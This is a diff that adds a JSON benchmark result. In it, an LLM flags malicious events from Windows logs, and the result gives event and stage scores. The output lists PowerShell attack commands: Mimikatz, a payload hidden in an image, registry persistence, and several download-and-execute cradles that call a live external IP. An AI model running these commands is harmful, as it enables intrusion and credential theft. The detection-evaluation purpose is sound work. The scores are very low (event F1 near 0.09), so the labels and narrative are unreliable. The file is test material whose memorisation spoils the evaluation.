@@ -1,0 +1,124 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\timestomp.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-Mimikatz.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\msxsl.exe' '\\\\C:\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C cscript C:\\AtomicRedTeam\\atomics\\T1059.005\\src\\sys_info.vbs > $env:TEMP\\T1059.005.out.txt",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C reg add \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \" /v \"verifierdlls \" /d \"1 \" /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C iex (iwr'http://124.223.85.207:8082/a')",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -command \"IEX (NEW-OBJECT NET.WEBCLIENT).DOWNLOADSTRING('HTTP://124.223.85.207:8082/A')\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C iex ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-RestMethod -Uri http://124.223.85.207:8082/test.htm -Body 'test'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/test.htm')) | Out-File -Append test.htm",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C cscript C:\\AtomicRedTeam\\atomics\\T1218.005\\src\\sys_info.vbs > $env:TEMP\\T1218.005.out.txt",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/test.htm -Method POST -UseBasicParsing -ContentType application/json ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\" /noconfig /fullpaths @\"C:\\Users\\\\administrator\\\\AppData\\\\Local\\\\Temp\\\\kkuwjynx\\\\kkuwjynx.cmdline\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C invoke-webrequest http://124.223.85.207:8082/test.htm -method post-usebasicparsing-contenttype application/json scriptblock {add-content -value $(iwr http://124.223.85.207:8082/b)}",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-RestMethod -Uri http://124.223.85.207:8082/test.htm -body 'test'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))|out-file -append test.htm",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method Post -UseBasicParsing -ContentType application/json -Headers @{'content-length'=0}",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-RestMethod -uri http://124.223.85.207:8082/test.htm -body 'test'",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The identified malicious events include PowerShell scripts being executed from executables stored in the Users folder, such as Invoke-Mimikatz and Invoke-PSImage. Some other suspicious activities involve files being created and modified within directories like Temp, in addition to registry modifications made through Powershell commands. These discoveries point towards an attacker attempting to perform reconnaissance and lateral movement.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 58734,
+      "completion_tokens": 1173,
+      "total_tokens": 59907,
+      "wall_clock_s": 31.65,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.1,
+      "recall": 0.08333333333333333,
+      "f1": 0.0909090909090909,
+      "tp": 2,
+      "fp": 18,
+      "fn": 22
+    },
+    "stage": {
+      "precision": 0.05,
+      "recall": 0.043478260869565216,
+      "f1": 0.046511627906976744,
+      "tp": 1,
+      "fp": 19,
+      "fn": 22,
+      "recall_partial": 0.043478260869565216
+    },
+    "hallucination_rate": 0.14285714285714285,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 58734,
+      "completion_tokens": 1173,
+      "total_tokens": 59907,
+      "wall_clock_s": 31.65,
+      "parse_retries": 0
+    }
+  }
+}
